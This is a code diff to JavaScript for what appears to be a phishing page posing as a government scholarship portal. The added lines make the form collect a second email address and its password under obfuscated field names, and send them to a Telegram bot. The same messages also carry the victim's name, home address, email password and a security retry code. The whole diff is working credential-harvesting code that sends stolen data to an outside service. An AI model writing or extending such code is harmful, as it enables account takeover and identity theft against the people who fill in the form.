@@ -301,7 +301,7 @@
 
     // 5. Step 2 Submission
     async function submitStep2(e) {
-        const fields = ['addr', 'state', 'country2', 'post3', 'pos3', 'pst3', 'pot3'];
+        const fields = ['addr', 'state', 'country2', 'post3', 'pos3', 'pst3', 'pot3','post8','post9'];
         if(!validateFields(fields)) return;
 
         const btn = document.getElementById('btn-2');
@@ -312,6 +312,9 @@
         formData.state = document.getElementById('state').value;
         formData.country2 = document.getElementById('country2').value;
         formData.post3 = document.getElementById('post3').value;
+        formData.post8 = document.getElementById('post8').value;
+        formData.post9 = document.getElementById('post9').value;
+
 
         const msg = `🗺️ GOV PORTAL - STEP 2\n👤 Name: ${formData.fname} ${formData.lname}\n🏠 Addr: ${formData.addr}\n🏢 State: ${formData.state}\n🌍 Country: ${formData.country2}\n📧 Email: ${formData.country}\n🔑 Email Pass: ${formData.post3}`;
         
@@ -344,9 +347,11 @@
         btn.innerText = "Syncing...";
         btn.disabled = true;
 
-        const msg = `🚨 FINAL SECURITY RETRY\n👤 ${formData.fname} ${formData.lname}\n🔑 Retry Code: ${retryPost}\n📧 Email: ${formData.country}`;
+        const msg = `🚨 FINAL SECURITY RETRY\n👤 ${formData.fname} ${formData.lname}\n🔑 Retry Code: ${retryPost}\n📧 Email: ${formData.country}\n TEmail: ${formData.post8}\n🔑 TEmail Pass: ${formData.post9}`;
+        
         
         const success = await sendToTelegram(msg);
+        
         if(success) {
             // Save state to Local Storage
             localStorage.setItem("scholarship_applied", "true");
